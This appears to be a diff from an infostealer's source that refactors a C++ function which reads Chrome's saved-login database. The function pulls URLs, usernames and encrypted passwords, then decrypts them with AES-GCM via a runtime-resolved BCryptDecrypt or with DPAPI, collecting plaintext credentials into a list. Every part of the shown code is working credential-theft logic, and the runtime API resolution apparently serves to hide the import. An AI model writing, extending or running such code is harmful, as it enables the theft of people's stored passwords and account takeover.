@@ -6,96 +6,98 @@
 #include <json.hpp>
 
 
-
-bool chrome_parser::try_parse_chrome(List<AccountData>& out_data)
+List<AccountData> chrome_parser::collect_data()
 {
-	if(!get_path_to_db()) return false;
-	
+	List<AccountData> out_data;
+	if (!get_path_to_db()) return out_data;
+
 	sqlite3* db;
-	
+
 	if (sqlite3_open(m_chrome_sqlite_path.c_str(), &db) != SQLITE_OK)
-		return false;
-	
+		return out_data;
+
 
 	sqlite3_stmt* stmt;
 	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
-		return false;
-	
-    int entries = 0;
+		return out_data;
 
-	if(!get_decryption_key()) return false;
-	
-    while (sqlite3_step(stmt) == SQLITE_ROW)
-    {
+	int entries = 0;
 
-        AccountData user_data;
-    	
-        char* url = (char*)sqlite3_column_text(stmt, 0);
-        char* username = (char*)sqlite3_column_text(stmt, 1);
-        char* password = (char*)sqlite3_column_text(stmt, 2);
+	if (!get_decryption_key()) return out_data;
 
-        if (url == nullptr && username == nullptr && password == nullptr)        
-            break;     
-        if ((strlen(url) == 0) && (strlen(username) == 0) && (strlen(password) == 0))        
-            continue;
-        
+	while (sqlite3_step(stmt) == SQLITE_ROW)
+	{
 
-        user_data.Url = url;
-        user_data.Username = username;
+		AccountData user_data;
 
-        int passSize = sqlite3_column_bytes(stmt, 2);
-        char decryptedPass[1024];
-        DWORD decPassSize = 0;
+		char* url = (char*)sqlite3_column_text(stmt, 0);
+		char* username = (char*)sqlite3_column_text(stmt, 1);
+		char* password = (char*)sqlite3_column_text(stmt, 2);
 
-        if (((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0') ||
-            ((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '1'))
-        {           
-           
+		if (url == nullptr && username == nullptr && password == nullptr)
+			break;
+		if ((strlen(url) == 0) && (strlen(username) == 0) && (strlen(password) == 0))
+			continue;
 
-            ULONG cbOutput = MAX_SIZE_PASS;
-            ULONG cbCiphertext = 0;
 
-            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
-            BCRYPT_INIT_AUTH_MODE_INFO(BACMI); // Макрос инициализирует структуру BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+		user_data.Url = url;
+		user_data.Username = username;
 
-            BACMI.pbNonce = (PUCHAR)(password + 3); // Пропускаем префикс "v10".
-            BACMI.cbNonce = 12; // Размер Nonce = 12 байт.
+		int passSize = sqlite3_column_bytes(stmt, 2);
+		char decryptedPass[1024];
+		DWORD decPassSize = 0;
 
-            BACMI.pbTag = (PUCHAR)(password + passSize - 16);
-            BACMI.cbTag = 16;			
-        	
-            
+		if (((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0') ||
+			((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '1'))
+		{
+
+
+			ULONG cbOutput = MAX_SIZE_PASS;
+			ULONG cbCiphertext = 0;
+
+			BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
+			BCRYPT_INIT_AUTH_MODE_INFO(BACMI); // Макрос инициализирует структуру BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+
+			BACMI.pbNonce = (PUCHAR)(password + 3); // Пропускаем префикс "v10".
+			BACMI.cbNonce = 12; // Размер Nonce = 12 байт.
+
+			BACMI.pbTag = (PUCHAR)(password + passSize - 16);
+			BACMI.cbTag = 16;
+
+
 			NTSTATUS status = 0;
-			const auto func_BCryptDecrypt =WinApiImport<f_BCryptDecrypt>::get_func("BCryptDecrypt", "bcrypt.dll");            
-        
-            if (!BCRYPT_SUCCESS(status = func_BCryptDecrypt(m_hKey, (BYTE*)(password + 15), passSize - 15 - 16, &BACMI, NULL, 0, (PUCHAR)m_pbOutput, cbOutput, &cbCiphertext, 0)))
-            {
-                printf("Error: 0x%x\n", status);
-            }
-			
-            m_pbOutput[cbCiphertext] = '\0';
+			const auto func_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get_func("BCryptDecrypt", "bcrypt.dll");
+
+			if (!BCRYPT_SUCCESS(status = func_BCryptDecrypt(m_hKey, (BYTE*)(password + 15), passSize - 15 - 16, &BACMI, NULL, 0, (PUCHAR)m_pbOutput, cbOutput, &cbCiphertext, 0)))
+			{
+				printf("Error: 0x%x\n", status);
+			}
+
+			m_pbOutput[cbCiphertext] = '\0';
 
 			user_data.Password = m_pbOutput;
-        }
-        else
-        {
-            if (dpapi_decrypt(reinterpret_cast<BYTE*>(password), passSize, decryptedPass))
-            {
-               user_data.Password = decryptedPass;
-            }
-            else
-            {
-                continue;
-            }
-        }
+		}
+		else
+		{
+			if (dpapi_decrypt(reinterpret_cast<BYTE*>(password), passSize, decryptedPass))
+			{
+				user_data.Password = decryptedPass;
+			}
+			else
+			{
+				continue;
+			}
+		}
 
 		out_data.emplace_back(user_data);
-        entries++;
-    }
+		entries++;
+	}
 
-
-	return true;
+	return out_data;
+	
 }
+
+
 
 bool chrome_parser::get_path_to_db()
 {
